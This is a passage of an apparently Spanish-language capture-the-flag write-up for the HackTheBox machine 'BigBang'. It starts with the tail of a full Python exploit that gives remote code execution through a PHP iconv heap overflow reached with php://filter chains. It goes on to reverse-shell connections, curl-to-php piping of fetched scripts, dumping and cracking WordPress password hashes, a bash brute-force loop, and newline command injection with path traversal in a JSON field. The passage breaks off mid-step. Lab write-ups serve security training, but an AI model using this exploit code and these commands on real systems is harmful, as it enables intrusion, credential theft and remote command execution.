            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -&gt; bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -&gt; list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -&gt; None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -&gt; None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -&gt; Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size &gt;= HEAP_SIZE
            and region.stop &amp; (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) &gt; 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -&gt; None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -&gt; str:

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap-&gt;free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) &lt;= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -&gt; None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep &lt;= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -&gt; bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -&gt; bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -&gt; bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -&gt; bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -&gt; bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -&gt; int:
        return self.stop - self.start


Exploit()
<br><img alt="Pasted image 20250202210905.png" src="machines/bigbang/imgs/pasted-image-20250202210905.png"><br><br>]]></description><link>machines/bigbang/01-recon.html</link><guid isPermaLink="false">Machines/BigBang/01-Recon.md</guid><pubDate>Wed, 05 Feb 2025 16:15:20 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250131121917.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/bigbang/imgs/pasted-image-20250131121917.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[User www-data]]></title><description><![CDATA[ 
 <br><br><br>Al estar en un contenedor no tenemos comandos como ss ni netstat pero si wget<br><br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ cat /proc/net/tcp
cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                                                                        
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0                                                                        
   1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24                                                                      
   2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1                                                                      
   3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1                                                                        
   4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1             
<br><br><br><br>Conexion 1<br>0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37202 1 0000000000000000 100 0 0 10 0
<br>
<br>Local Address (00000000:0050) :

<br>IP: 0.0.0.0 (escucha en todas las interfaces).
<br>Puerto: 0x0050 = 80 (HTTP).


<br>Remote Address (00000000:0000) :

<br>IP: 0.0.0.0 (sin conexión remota).
<br>Puerto: 0 (ningún puerto remoto asignado).


<br>Estado (0A) : Estado LISTEN (esperando conexiones entrantes).
<br>UID : 0 (proceso pertenece al usuario root o sistema).
<br>Descripción : Esta es una conexión HTTP que está escuchando en el puerto 80. (el blog)
<br>Conexion 2<br>1: 030011AC:9A3C 2A100A0A:115C 01 00000000:00000000 00:00000000 00000000    33        0 84716 1 0000000000000000 566 4 30 10 24
<br>
<br>Local Address (030011AC:9A3C) :

<br>IP: 192.168.0.3 (convertido de 030011AC).
<br>Puerto: 0x9A3C = 39484.


<br>Remote Address (2A100A0A:115C) :

<br>IP: 10.16.42.42 (convertido de 2A100A0A).
<br>Puerto: 0x115C = 4444.


<br>Estado (01) : Estado ESTABLISHED (conexión activa).
<br>UID : 33 (generalmente el usuario www-data en sistemas web).
<br>Descripción : Una conexión establecida desde 192.168.0.3:39484 hacia 10.16.42.42:4444. (nuestra rev-shell)
<br>Conexion 3 <br>2: 030011AC:9CD6 010011AC:0CEA 01 00000000:00000000 02:0009B676 00000000    33        0 368393 2 0000000000000000 20 4 17 10 -1
<br>
<br>Local Address (030011AC:9CD6) :

<br>IP: 192.168.0.3.
<br>Puerto: 0x9CD6 = 39958.


<br>Remote Address (010011AC:0CEA) :

<br>IP: 192.168.0.1.
<br>Puerto: 0x0CEA = 3306 (puerto MySQL).


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Una conexión establecida desde 192.168.0.3:39958 hacia 192.168.0.1:3306 (base de datos MySQL de la cual ya tenemos credenciales (wp-config.php de recon).
<br>Conexion 4<br>3: 030011AC:E4A8 010011AC:0CEA 01 00000000:00000000 02:000300EF 00000000    33        0 85383 2 0000000000000000 20 4 1 10 -1
<br>
<br>Local Address (030011AC:E4A8) :

<br>IP: 192.168.0.3.
<br>Puerto: 0xE4A8 = 58536.


<br>Remote Address (010011AC:0CEA) :

<br>IP: 192.168.0.1.
<br>Puerto: 0x0CEA = 3306 (MySQL).


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Otra conexión hacia la base de datos MySQL en 192.168.0.1:3306.
<br>Conexion 5<br>4: 030011AC:A3B0 400E0A0A:115C 01 00000012:00000000 01:00000024 00000000    33        0 368396 3 0000000000000000 36 4 30 10 -1
<br>
<br>Local Address (030011AC:A3B0) :

<br>IP: 192.168.0.3.
<br>Puerto: 0xA3B0 = 41872.


<br>Remote Address (400E0A0A:115C) :

<br>IP: 10.14.10.64.
<br>Puerto: 0x115C = 4444.


<br>Estado (01) : Estado ESTABLISHED.
<br>UID : 33 (usuario www-data).
<br>Descripción : Una conexión establecida desde 192.168.0.3:41872 hacia 10.14.10.64:4444.
<br><br><br>Vamos a usar ligolo-ng para hacer pivoting creando un puente entre la maquina y nuestro host:<br> ligolo en vez de usar un SOCKS proxy o TCP/UDP fowarding, Ligolo-ng crea un userland network stack usando  <a data-tooltip-position="top" aria-label="https://gvisor.dev/" rel="noopener nofollow" class="external-link" href="https://gvisor.dev/" target="_blank">Gvisor</a>.<br>Esta herramienta nos permite pivotar en la maquina de forma muchisimo mas rapida de lo que podria hacer chisel o meterpreter<br>Subimos a la máquina victima (derecha) el agent y desde el host (izquierda) ajustamos el proxy; Una vez establecido el tunel podemos ver que tenemos conexión con el puerto 3306 de la victima (mysql)<br>
<img alt="Pasted image 20250203003144.png" src="machines/bigbang/imgs/pasted-image-20250203003144.png"><br>Probamos a conectarnos al mysql :<br>Intento conectarme al servidor de mysql sin exito<br>
<img alt="Pasted image 20250203003751.png" src="machines/bigbang/imgs/pasted-image-20250203003751.png"><br>
Aun con el tunel establecido no soy capaz de entablar la conexion; eso significa que o bien el mysql no esta corriendo (no es el caso) o tiene un cortafuegos.<br>La maquina victima (dockerizada) no tiene el binario mysql pero si que sabemos que tiene php por lo que podemos intentar entrar en la base de datos mediante un script ;<br>&lt;?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';

$conn = new mysqli($host, $user, $pass, $db);

if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
echo "Connected successfully\n";

$result = $conn-&gt;query("SHOW TABLES");
while ($row = $result-&gt;fetch_row()) {
    echo $row[0] . "\n";
}
$conn-&gt;close();
?&gt;
<br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/trythis.php | php
&lt;s/wp-admin$ curl 10.10.14.64:8000/trythis.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   379  100   379    0     0   1041      0 --:--:-- --:--:-- --:--:--  1044
Connected successfully
wp_commentmeta
wp_comments
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ 
<br>Bingo!<br>sacamos los datos de la tabla wp_users:<br>&lt;?php
$host = '172.17.0.1';
$user = 'wp_user';
$pass = 'wp_password';
$db = 'wordpress';


$conn = new mysqli($host, $user, $pass, $db);


if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
echo "Connected successfully\n";


$query = "SELECT * FROM wp_users";
$result = $conn-&gt;query($query);

// Verificar si hay resultados
if ($result-&gt;num_rows &gt; 0) {
    // Iterar sobre cada fila de la tabla wp_users
    while ($row = $result-&gt;fetch_assoc()) {
        // Imprimir todas las columnas de la fila
        foreach ($row as $key =&gt; $value) {
            echo "$key: $value\n";
        }
        echo "------------------------\n"; // Separador entre usuarios
    }
} else {
    echo "No se encontraron registros en la tabla wp_users.\n";
}


$conn-&gt;close();
?&gt;
<br>voi là !<br>www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php
&lt;/wp-admin$ curl 10.10.14.64:8000/wp_users.php | php    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   963  100   963    0     0   4125      0 --:--:-- --:--:-- --:--:--  4133
Connected successfully
ID: 1
user_login: root
user_pass: $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
user_nicename: root
user_email: root@bigbang.htb
user_url: http://blog.bigbang.htb
user_registered: 2024-05-31 13:06:58
user_activation_key: 
user_status: 0
display_name: root
------------------------
ID: 3
user_login: shawking
user_pass: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
user_nicename: shawking
user_email: shawking@bigbang.htb
user_url: 
user_registered: 2024-06-01 10:39:55
user_activation_key: 
user_status: 0
display_name: Stephen Hawking
------------------------

<br>Bueno a crackear esas passwords!<br>➜  BigBang hashcat --identify shawkinghash 
The following hash-mode match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
    400 | phpass                                                     | Generic KDF
<br><br><br>Crackeamos el el phpass<br>
hashcat -a 0 -m 400 shawkinghash /usr/share/wordlists/rockyou.txt

$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
Time.Started.....: Mon Feb  3 20:49:54 2025 (12 mins, 36 secs)
Time.Estimated...: Mon Feb  3 21:02:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5901 H/s (10.65ms) @ Accel:256 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4456448/14344385 (31.07%)
Rejected.........: 0/4456448 (0.00%)
Restore.Point....: 4454400/14344385 (31.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidate.Engine.: Device Generator
Candidates.#1....: quaqua8 -&gt; qu956421
Hardware.Mon.#1..: Temp: 82c Util: 89%

Started: Mon Feb  3 20:49:51 2025
Stopped: Mon Feb  3 21:02:31 2025

<br>Usamos esa clave para conectarnos por ssh a la maquina y el usuario shawking<br>]]></description><link>machines/bigbang/02-exploitation.html</link><guid isPermaLink="false">Machines/BigBang/02-exploitation.md</guid><pubDate>Wed, 05 Feb 2025 16:16:06 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250203003144.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/bigbang/imgs/pasted-image-20250203003144.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-User-Shawking]]></title><description><![CDATA[ 
 <br><br>Empezamos por enumerar los usuarios del sistema que manejen una bash<br>shawking@bigbang:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:George Hubble:/home/george:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
<br>Parece que tenemos dos usuarios mas escalables en el sistema; george y developer. Guardaremos la infor para mas adelante.<br>Sudo -l :<br>
not my luckiest day...<br>shawking@bigbang:~$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
<br>Cron:<br>shawking@bigbang:~$ crontab -e
no crontab for shawking - using an empty one
<br>Netstat<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3306         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42669         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -       
<br>Puede que tengamos algo jugosillo en ese puerto 9090<br>Intento hacer pivoting para ver que hay en ese puerto 9090<br>
pero nada;<br>
<img alt="Pasted image 20250204001637.png" src="machines/bigbang/imgs/pasted-image-20250204001637.png"><br>shawking@bigbang:~$ nc -nz 127.0.0.1 9090
shawking@bigbang:~$ echo $?
0

<br>Parece que el puerto funciona;<br>Probamos el puerto con un tunel ssh:<br>ssh shawking@bigbang.htb -L 9090:127.0.0.1:9090
<br>Escaneando con FeroxBuster encontramos un /login y un /command en la pagina web<br>405      GET        5l       20w      153c http://127.0.0.1:9090/login
405      GET        5l       20w      153c http://127.0.0.1:9090/command

<br><img alt="Pasted image 20250204110951.png" src="machines/bigbang/imgs/pasted-image-20250204110951.png"><br>Nos da un 405<br>
<img alt="Pasted image 20250204111114.png" src="machines/bigbang/imgs/pasted-image-20250204111114.png"><br><br>Segun nuestro analisis previo el endpoint en el :9090 es un servidor web<br>sudo nmap -sCV -Pn -n -p 9090 127.0.0.1 --script http-methods      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 11:46 CET
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.83% done; ETC: 11:46 (0:00:00 remaining)
Nmap scan report for 127.0.0.1
Host is up (0.000069s latency).

PORT     STATE SERVICE VERSION
9090/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.10.12)
|_http-server-header: Werkzeug/3.0.3 Python/3.10.12

<br>Fuzz:<br>
del fuzz sacamos los siguientes endpoints<br>
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:9090/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 404ms]
command                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 177ms]
<br>Endpoints:<br>
<a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/login" target="_blank">http://127.0.0.1:9090/login</a><br>
<a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/command" target="_blank">http://127.0.0.1:9090/command</a><br><br>Vamos a hacer bruteforce para intentar entrar como el usuario "developer" en <a rel="noopener nofollow" class="external-link" href="http://127.0.0.1:9090/login" target="_blank">http://127.0.0.1:9090/login</a><br>#!/bin/bash


URL="http://127.0.0.1:9090/login"

PASSWORD_FILE="/usr/share/wordlists/rockyou.txt"


USERNAME="developer"


while IFS= read -r PASSWORD; do
  echo "Probando pass: $PASSWORD"

  RESPONSE=$(curl -X POST -s -o /dev/null -w "%{http_code}" "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")

  
  if [ "$RESPONSE" != "405" ]  &amp;&amp; [ "$RESPONSE" != "401" ]; then
    echo "¡Contraseña encontrada! -&gt; $PASSWORD"
    echo "respuesta: $RESPONSE"
    break
  fi
done &lt; $PASSWORD_FILE

<br>bingo bingo bingo<br>¡Contraseña encontrada! -&gt; bigbang
respuesta: 200
<br><br>Podemos loguearnos al usuario developer con la misma password; en ella encontramos un archivo .apk en al siguiente ruta :<br>
/home/developer/android/satellite-app.apk<br><br>➜  9090 curl -X POST -v 127.0.0.1:9090/login \    
-H "Content-Type: application/json" \
-d '{"username":"developer","password":"bigbang"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:9090...
* Connected to 127.0.0.1 (127.0.0.1) port 9090
* using HTTP/1.x
&gt; POST /login HTTP/1.1
&gt; Host: 127.0.0.1:9090
&gt; User-Agent: curl/8.11.1
&gt; Accept: */*
&gt; Content-Type: application/json
&gt; Content-Length: 45
&gt; 
* upload completely sent off: 45 bytes
&lt; HTTP/1.1 200 OK
&lt; Server: Werkzeug/3.0.3 Python/3.10.12
&lt; Date: Tue, 04 Feb 2025 10:28:53 GMT
&lt; Content-Type: application/json
&lt; Content-Length: 356
&lt; Connection: close
&lt; 
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODY2NDkzMywianRpIjoiZmM5OGUzYzMtMTJlNy00MjYwLWFlZmEtZGMzZjlhMThhNGMwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODY2NDkzMywiY3NyZiI6IjIyNjBlMzBhLWNkY2YtNDYzZS1iZmZiLTUwYjNjNWEwZTIzNiIsImV4cCI6MTczODY2ODUzM30.oNh4nYggI9d8ue_IrB3yaV9luehyMiMYeQW3dgEOcm8"}
* shutting down connection #0

<br><br>Get no esta permitido pues probamos nuestra vieja confiable POST<br>
<img alt="Pasted image 20250205114416.png" src="machines/bigbang/imgs/pasted-image-20250205114416.png"><br>Permite POST:<br>shawking@bigbang:/home/shawking$ curl -X POST http://localhost:9090/command
{"msg":"Missing Authorization Header"}
<br>Para el authorization Header vamos a probar con el access_token que nos proporciono la pagina web en el /login<br>-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODc1NDkzMSwianRpIjoiMzU5MGRjODMtNjNjMC00OTgxLWI2NDQtZjQyODFhOWE1MjdmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODc1NDkzMSwiY3NyZiI6IjU1YmYyYjRkLTlkNTMtNGZlNS1hMDBkLWI5ZjJlYjRkYjhmOSIsImV4cCI6MTczODc1ODUzMX0.-FKF_--KXab_qc0LqvhSow5fIviN5YBPO6tS1QoW3wE"
<br>El endpoint acepta JSON data en este formato:<br>`{     
"command": "send_image",
"output_file": "works.jpg"
}`
<br><img alt="Pasted image 20250205123032.png" src="machines/bigbang/imgs/pasted-image-20250205123032.png"><br>la variable output_file puede estar mal sanitizada  y llevarnos a rce vamos a probar<br><br>{
    "command": "send_image",
    "output_file": "test.png&amp;whoami"
}
<br>Response:<br>{"error":"Output file path contains dangerous characters"}
<br>Con \n:<br>{
    "command": "send_image",
    "output_file": "test.png\nwhoami"
}
<br>Response:<br>{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nwhoami'"}
<br>Vemos que busca un directorio, vamos a probar a leer archivos;<br>{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../etc/passwd"

}
<br>{"error":"Error generating image: /bin/sh: 2: ../../../../../etc/passwd: Permission denied\n"}
<br>Podemos cambiar los permisos del bash<br>{
